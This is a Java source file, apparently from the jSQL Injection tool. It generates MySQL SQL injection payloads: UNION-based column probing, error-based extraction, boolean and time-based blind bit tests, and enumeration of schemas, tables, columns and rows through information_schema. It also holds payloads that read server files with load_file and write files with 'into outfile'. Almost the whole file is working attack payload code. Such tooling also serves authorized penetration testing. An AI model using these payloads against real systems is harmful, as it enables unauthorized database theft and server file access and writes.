package com.jsql.model.injection.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.model.injection.strategy.NormalStrategy;
import com.jsql.model.injection.strategy.Strategy;
import com.jsql.model.injection.strategy.blind.ConcreteTimeInjection;
import com.jsql.util.StringUtil;

public class MySQLVendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "concat(" +
                "" +
                    "concat_ws(" +
                        "0x04," +
                        "version()," +
                        "database()," +
                        "user()" +
                    ")" +
                "" +
                "," +
                "0x01030307" +
            ")";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "0x04," +
                        "r," +
                        "0x05," +
                        "cast(q+as+char)," +
                        "0x04" +
                        "+order+by+r+" +
                        "separator+0x06" +
                    ")," +
                    "0x01030307" +
                ")" +
            "from(" +
                "select+" +
                    "cast(TABLE_SCHEMA+as+char)r," +
                    "count(TABLE_NAME)q+" +
                "from+" +
                    "INFORMATION_SCHEMA.tables+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "0x04," +
                        "cast(r+as+char)," +
                        "0x05," +
                        "cast(ifnull(q,0x30)+as+char)," +
                        "0x04+" +
                        "order+by+r+" +
                        "separator+0x06" +
                    ")," +
                    "0x01030307" +
                ")" +
            "from(" +
                "select+" +
                    "TABLE_NAME+r," +
                    "table_rows+q+" +
                "from+" +
                    "information_schema.tables+" +
                "where+" +
                    "TABLE_SCHEMA=0x" + StringUtil.strhex(database.toString())  + "+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "0x04," +
                        "cast(n+as+char)," +
                        "0x05," +
                        "0," +
                        "0x04+" +
                        "order+by+n+" +
                        "separator+0x06" +
                    ")," +
                    "0x01030307" +
                ")" +
            "from(" +
                "select+" +
                    "COLUMN_NAME+n+" +
                "from+" +
                    "information_schema.columns+" +
                "where+" +
                    "TABLE_SCHEMA=0x" + StringUtil.strhex(table.getParent().toString()) + "+" +
                    "and+" +
                    "TABLE_NAME=0x" + StringUtil.strhex(table.toString()) + "+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        // character 7f, last available hexa character (starting at character 80, it gives ?)
        formatListColumn = formatListColumn.replace("{%}", "`,0x00)),0x7f,trim(ifnull(`");
        
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))";
        
        return
            "select+concat(" +
                "group_concat(" +
                    "0x04," +
                    "r," +
                    "0x05," +
                    "cast(q+as+char)," +
                    "0x04" +
                    "+order+by+r+separator+0x06" +
                ")," +
                "0x01030307" +
            ")from(" +
                "select+" +
                    "cast(concat(" + formatListColumn + ")as+char)r," +
                    "count(*)q+" +
                "from+" +
                    "`" + database + "`.`" + table + "`+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String sqlPrivilegeTest() {
        return
            /**
             * error base convert 0x01030307 to \x01\x03\x03\x07
             * => force into character
             */
            "cast(" +
                "concat(" +
                    "(" +
                        "select+" +
                            "if(count(*)=1,0x" + StringUtil.strhex("true") + ",0x" + StringUtil.strhex("false") + ")" +
                        "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
                        "where+" +
                            "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
                            "and+PRIVILEGE_TYPE=0x46494c45" +
                    ")" +
                    "," +
                    "0x01030307" +
                ")" +
            "+as+char)";
    }

    @Override
    public String sqlFileRead(String filePath) {
        return
            /**
             * error base convert 0x01030307 to \x01\x03\x03\x07
             * => force into character
             */
            "cast(" +
                "concat(load_file(0x" + StringUtil.strhex(filePath) + "),0x01030307)" +
            "as+char)";
    }

    @Override
    public String sqlTextIntoFile(String content, String filePath) {
        return
            MediatorModel.model().getIndexesInUrl()
                .replaceAll(
                    "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).getVisibleIndex() + "7331",
                    "(select+0x" + StringUtil.strhex(content) + ")"
                )
                .replaceAll("--++", "")
                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String sqlTestBlindFirst() {
        return "0%2b1=1";
    }

    @Override
    public String sqlTestBlind(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String sqlLengthTestBlind(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String sqlTimeTest(String check) {
        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
    }

    @Override
    public String sqlBitTestTime(String inj, int indexCharacter, int bit) {
        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
    }

    @Override
    public String sqlLengthTestTime(String inj, int indexCharacter) {
        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
    }

    @Override
    public String sqlBlind(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                "concat(" +
                    "0x53514c69," +
                    "mid(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        Strategy.BLIND.instance().getPerformanceLength() +
                    ")" +
                ")" +
            ")";
    }

    @Override
    public String sqlTime(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            Strategy.TIME.instance().getPerformanceLength() +
                        ")" +
                    ")" +
            ")";
    }

    @Override
    public String sqlTestErrorBased() {
        return
            "+and(" +
                "select+1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "floor(rand(0)*2)" +
                    "from+" +
                        "information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String sqlErrorBased(String sqlQuery, String startPosition) {
        return
            "+and" +
                "(" +
                "select+" +
                    "1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "concat(" +
                            "0x53514c69," +
                            "replace(" +
                                "mid(" +
                                    "replace(" +
                                    "replace(" +
                                        "(" + sqlQuery + ")" +
                                    /**
                                     * errorbased convert \r into \r\n => counting inaccurate
                                     * force 0x0A into 0x0102
                                     */
                                    ",0x0A,0x0102)" +
                                    /**
                                     * avoid empty character that breaks injection
                                     */
                                    ",0x00,'')," +
                                    startPosition + "," +
                                    /**
                                     * errorbase gets 64 characters: 'SQLi' consumes 4
                                     * useless to get all the 64 => getting only 60
                                     */
                                    "60" +
                                ")" +
                            /**
                             * force back 0x0102 into 0x0D
                             */
                            ",0x0102,0x0A)," +
                            "floor(rand(0)*2)" +
                        ")" +
                    "from+information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                    /**
                     * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                     */
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            /**
                             * Minus 'SQLi' should apply
                             */
                            Strategy.NORMAL.instance().getPerformanceLength() +
                        ")" +
                    ")" +
            ")";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select+concat(0x53514c69,$1,repeat(0x23,65536),0x010303074c5153))"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("1337"+ i +"7330%2b1");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }
}